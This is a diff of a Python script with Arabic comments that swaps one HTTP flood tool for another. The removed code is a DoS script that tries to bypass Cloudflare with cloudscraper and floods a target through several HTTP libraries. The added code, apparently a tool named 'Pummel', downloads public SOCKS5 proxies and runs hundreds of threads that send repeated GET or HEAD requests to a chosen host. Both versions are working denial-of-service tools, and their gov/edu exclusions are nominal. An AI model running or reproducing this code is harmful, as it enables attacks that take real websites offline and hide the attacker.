@@ -1,187 +1,162 @@
-import cloudscraper
-import asyncio
-import time
-import aiohttp
-import httpx
+import os
 import random
+import time
+import socket
+import sys
+import threading
 import requests
-from concurrent.futures import ThreadPoolExecutor
+import socks
+import ssl
 
-# طلب البروكسيات من المستخدم
-def get_proxies_from_user():
-    proxies = []
-    use_proxy = input("هل تريد استخدام بروكسي؟ (y/n): ").strip().lower()
-    if use_proxy == 'y':
-        print("أدخل عناوين البروكسيات (اكتب 'end' لإنهاء الإدخال):")
-        while True:
-            proxy = input("أدخل عنوان البروكسي (مثال: username:password@host:port): ").strip()
-            if proxy.lower() == 'end':
-                break
-            proxies.append(proxy)
-        print(f"[*] تم إضافة {len(proxies)} بروكسي.")
-    return proxies
+# واجهة المستخدم
+print('''\r\n
+██████╗ ██╗   ██╗███╗   ███╗███╗   ███╗███████╗██╗         
+██╔══██╗██║   ██║████╗ ████║████╗ ████║██╔════╝██║         
+██████╔╝██║   ██║██╔████╔██║██╔████╔██║█████╗  ██║         
+██╔═══╝ ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██║         
+██║     ╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗███████╗    
+╚═╝      ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝   
+┌─────────────────────────────────────────────────────┐
+│ version 1.2.8                                       │
+│                                                     │
+│          [!!!Prevent Illegal CC-Attack!!!]          │                      
+│                                                     │
+│                               Code By HC the Chlous │
+├─────────────────────────────────────────────────────┤
+│       Github: https://github.com/HC133/Pummel	      │
+│           [!]DO NOT ATTACK GOV WEBSITE[!]           │
+└─────────────────────────────────────────────────────┘\r\n''')
 
+# قائمة User-Agent
+useragents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
+    # ... (أضف بقية الـ User-Agents هنا)
+]
 
-# محاولة تجاوز الحمايات باستخدام CloudScraper
-def bypass_protection(target_url):
+# قائمة Accept headers
+acceptall = [
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+    "Accept-Encoding: gzip, deflate\r\n",
+    # ... (أضف بقية الـ Accept headers هنا)
+]
+
+# دالة لتنزيل قائمة SOCKS5 proxies
+def clone():
     try:
-        print("[*] محاولة تجاوز الحماية باستخدام CloudScraper...")
-        scraper = cloudscraper.create_scraper()
+        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&timeout=1500")
+        with open("socks5.txt", "wb") as f:
+            f.write(r.content)
+        print("Socks Downloaded Successfully!")
+    except Exception as e:
+        print(f"Error downloading socks: {e}")
 
-        # إعداد Headers لمحاكاة متصفح حقيقي
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1"
-        }
+# دالة لمنع الهجمات على عناوين محددة
+def prevent():
+    if '192.168' in ip or '127.0' in ip or '172.16' in ip or 'localhost' in ip:
+        print("Error: Invalid IP range!")
+        sys.exit()
+    if 'gov' in ip or 'edu' in ip:
+        print("Error: Cannot attack .gov or .edu websites!")
+        sys.exit()
 
-        # إرسال الطلب باستخدام CloudScraper
-        response = scraper.get(target_url, headers=headers, timeout=10)
+# الدالة الرئيسية
+def main():
+    global ip, port, page, th_num, proxies, multiple, mode
 
-        if response.status_code == 200:
-            print("[*] تجاوز الحماية بنجاح!")
-            return scraper.cookies, headers
-        else:
-            print("[!] فشل تجاوز الحماية، الكود:", response.status_code)
-            return None, None
-    except Exception:
-        # تجاهل الأخطاء
-        return None, None
+    mode = input("Mode You Want To Choose (get/head): ").lower() or "get"
+    if mode not in ["get", "head"]:
+        print("Invalid mode! Using 'get' as default.")
+        mode = "get"
 
+    ip = input("Address/Host: ")
+    prevent()
 
-# إرسال طلب باستخدام aiohttp
-async def send_request_aiohttp(url, session, request_counter, response_times, semaphore, proxy=None):
-    async with semaphore:
+    page = input("Page (default=/): ") or "/"
+    port = input("Port (default=80, HTTPS=443): ") or "80"
+    port = int(port)
+
+    th_num = input("Threads (default=300): ") or "300"
+    th_num = int(th_num)
+
+    if input("Download SOCKS5 list? (y/n): ").lower() != "n":
+        clone()
+
+    out_file = input("Enter Proxy File Path (default=socks5.txt): ") or "socks5.txt"
+    proxies = open(out_file).readlines()
+    print(f"Number of SOCKS5 Proxies: {len(proxies)}")
+
+    if input("Check the SOCKS list? (y/n, default=y): ").lower() != "n":
+        check_socks()
+
+    multiple = input("Input the Multiple (default=100): ") or "100"
+    multiple = int(multiple)
+
+# دالة لإرسال طلبات GET
+def get():
+    while True:
         try:
-            start_time = time.time()
-            if proxy:
-                # تقسيم البروكسي إلى مكوناته
-                proxy_parts = proxy.split('@')
-                auth, host_port = proxy_parts[0], proxy_parts[1]
-                proxy_url = f"http://{host_port}"
-                proxy_auth = aiohttp.BasicAuth(auth.split(':')[0], auth.split(':')[1])
-                async with session.get(url, proxy=proxy_url, proxy_auth=proxy_auth) as response:
-                    await response.read()
-            else:
-                async with session.get(url) as response:
-                    await response.read()
-            request_counter[0] += 1
-            response_times.append(time.time() - start_time)
-        except Exception:
-            request_counter[1] += 1
+            proxy = random.choice(proxies).strip().split(":")
+            socks.set_default_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
+            s = socks.socksocket()
+            if port == 443:
+                ctx = ssl.create_default_context()
+                s = ctx.wrap_socket(s, server_hostname=ip)
+            s.connect((ip, port))
+            for _ in range(multiple):
+                request = f"GET {page} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(useragents)}\r\n{random.choice(acceptall)}\r\n"
+                s.send(request.encode())
+            s.close()
+        except Exception as e:
+            pass
 
-
-# إرسال طلب باستخدام httpx
-async def send_request_httpx(url, client, request_counter, response_times, semaphore, proxy=None):
-    async with semaphore:
+# دالة لإرسال طلبات HEAD
+def head():
+    while True:
         try:
-            start_time = time.time()
-            if proxy:
-                # تقسيم البروكسي إلى مكوناته
-                proxy_parts = proxy.split('@')
-                auth, host_port = proxy_parts[0], proxy_parts[1]
-                proxy_url = f"http://{host_port}"
-                proxies = {
-                    "http://": f"http://{auth}@{host_port}",
-                    "https://": f"http://{auth}@{host_port}"
-                }
-                response = await client.get(url, proxies=proxies)
-            else:
-                response = await client.get(url)
-            request_counter[0] += 1
-            response_times.append(time.time() - start_time)
-        except Exception:
-            request_counter[1] += 1
+            proxy = random.choice(proxies).strip().split(":")
+            socks.set_default_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
+            s = socks.socksocket()
+            if port == 443:
+                ctx = ssl.create_default_context()
+                s = ctx.wrap_socket(s, server_hostname=ip)
+            s.connect((ip, port))
+            for _ in range(multiple):
+                request = f"HEAD {page} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(useragents)}\r\n{random.choice(acceptall)}\r\n"
+                s.send(request.encode())
+            s.close()
+        except Exception as e:
+            pass
 
+# دالة لفحص SOCKS proxies
+def check_socks():
+    global proxies
+    working_proxies = []
+    for proxy in proxies:
+        try:
+            socks.set_default_proxy(socks.SOCKS5, proxy.split(":")[0], int(proxy.split(":")[1]))
+            s = socks.socksocket()
+            s.settimeout(5)
+            s.connect((ip, port))
+            s.close()
+            working_proxies.append(proxy)
+        except:
+            pass
+    proxies = working_proxies
+    print(f"Checked proxies. Working: {len(proxies)}")
 
-# إرسال طلب باستخدام requests
-def send_request_requests(url, request_counter, response_times, proxy=None):
-    try:
-        start_time = time.time()
-        if proxy:
-            # تقسيم البروكسي إلى مكوناته
-            proxy_parts = proxy.split('@')
-            auth, host_port = proxy_parts[0], proxy_parts[1]
-            proxies = {
-                "http": f"http://{auth}@{host_port}",
-                "https": f"http://{auth}@{host_port}"
-            }
-            response = requests.get(url, timeout=10, proxies=proxies)
-        else:
-            response = requests.get(url, timeout=10)
-        if response.status_code == 200:
-            request_counter[0] += 1
-            response_times.append(time.time() - start_time)
-    except Exception:
-        request_counter[1] += 1
-
-
-# الوظيفة الرئيسية للهجوم
-async def main(target_url, threads_count, attack_duration, proxies=None):
-    print("[*] بدء هجوم DoS...")
-    request_counter = [0, 0]  # [الطلبات الناجحة, الطلبات الفاشلة]
-    response_times = []
-    semaphore = asyncio.Semaphore(threads_count)  # التحكم في عدد الطلبات المتزامنة
-
-    # محاولة تجاوز الحماية
-    cookies, headers = bypass_protection(target_url)
-
-    if not cookies or not headers:
-        print("[!] لم يتم تجاوز الحماية، سيتم متابعة الهجوم بدون كوكيز أو Headers.")
-
-    # إعداد الجلسات
-    timeout = aiohttp.ClientTimeout(total=10)
-    aiohttp_session_args = {"timeout": timeout}
-    httpx_client_args = {}
-
-    if cookies and headers:
-        aiohttp_session_args["cookies"] = cookies
-        aiohttp_session_args["headers"] = headers
-        httpx_client_args["cookies"] = cookies
-        httpx_client_args["headers"] = headers
-
-    async with aiohttp.ClientSession(**aiohttp_session_args) as aiohttp_session, httpx.AsyncClient(**httpx_client_args) as httpx_client:
-        end_time = time.time() + attack_duration
-        tasks = []
-
-        # تشغيل tasks
-        with ThreadPoolExecutor(max_workers=threads_count) as executor:
-            while time.time() < end_time:
-                # اختيار بروكسي عشوائي إذا تم توفير قائمة بروكسيات
-                proxy = random.choice(proxies) if proxies else None
-
-                # إضافة مهام aiohttp
-                tasks.append(asyncio.create_task(send_request_aiohttp(target_url, aiohttp_session, request_counter, response_times, semaphore, proxy)))
-
-                # إضافة مهام httpx
-                tasks.append(asyncio.create_task(send_request_httpx(target_url, httpx_client, request_counter, response_times, semaphore, proxy)))
-
-                # إضافة مهام requests
-                executor.submit(send_request_requests, target_url, request_counter, response_times, proxy)
-
-                # تجنب إنشاء عدد ضخم من المهام دفعة واحدة
-                if len(tasks) >= threads_count:
-                    await asyncio.gather(*tasks)
-                    tasks = []
-
-            # التأكد من تشغيل أي مهام متبقية
-            if tasks:
-                await asyncio.gather(*tasks)
-
-    avg_response_time = sum(response_times) / len(response_times) if response_times else 0
-    print(f"\n[*] انتهى الهجوم. العدد الكلي للطلبات الناجحة: {request_counter[0]}, الفاشلة: {request_counter[1]}")
-    print(f"[*] متوسط زمن الاستجابة: {avg_response_time:.4f} ثواني.")
-
-
+# تشغيل البرنامج
 if __name__ == "__main__":
-    target_url = input("أدخل عنوان URL المستهدف (http://example.com): ").strip()
-    threads_count = int(input("أدخل عدد الخيوط (Threads): ").strip())
-    attack_duration = int(input("أدخل مدة الهجوم بالثواني: ").strip())
-    
-    # طلب البروكسيات من المستخدم
-    proxies = get_proxies_from_user()
+    main()
+    threads = []
+    for _ in range(th_num):
+        if mode == "get":
+            t = threading.Thread(target=get)
+        else:
+            t = threading.Thread(target=head)
+        t.daemon = True
+        t.start()
+        threads.append(t)
 
-    asyncio.run(main(target_url, threads_count, attack_duration, proxies))
+    for t in threads:
+        t.join()
